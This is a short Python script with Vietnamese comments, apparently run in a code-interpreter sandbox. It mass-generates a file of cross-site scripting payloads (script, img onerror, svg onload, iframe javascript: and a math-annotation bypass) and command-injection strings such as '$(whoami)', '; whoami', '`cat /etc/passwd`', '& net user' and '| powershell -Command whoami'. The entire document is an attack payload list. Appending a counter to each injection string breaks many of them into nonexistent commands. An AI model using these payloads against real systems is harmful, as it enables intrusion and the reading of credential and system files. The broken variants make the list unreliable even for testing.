# Sau khi môi trường bị reset, cần chạy lại từ đầu để tạo lại file payloads

# Tạo lại danh sách các payload XSS
base_payloads = [
    "<script>alert({})</script>",
    "<img src=x onerror=alert({})>",
    "<svg onload=alert({})>",
    "<iframe src='javascript:alert({})'>",
    "<body onload=alert({})>",
    "'\"><script>alert({})</script>",
    "<math><mtext></mtext><annotation encoding='application/x-xml'>"
    "<script>alert({})</script></annotation></math>"
]

max_payloads = 10000
payload_list = []
for i in range(max_payloads):
    for template in base_payloads:
        payload_list.append(template.format(i))

# Tạo danh sách các payload RCE
rce_payloads = [
    "`whoami`",
    "$(whoami)",
    "${@print(md5)}",
    "|| whoami",
    "& whoami",
    "; whoami",
    "`cat /etc/passwd`",
    "$(ls -la)",
    "|| dir",
    "& net user",
    "| powershell -Command whoami",
    "'; ls; #",
    "' && ls && '",
]

max_rce = 1000
rce_list = []
for i in range(max_rce):
    for template in rce_payloads:
        rce_list.append(f"{template}_{i}")

# Gộp danh sách XSS và RCE
full_payload_list = payload_list + rce_list

# Ghi vào file
full_file_path = "/mnt/data/xss_rce_payloads.txt"
with open(full_file_path, "w", encoding="utf-8") as f:
    f.write("\n".join(full_payload_list))

full_file_path
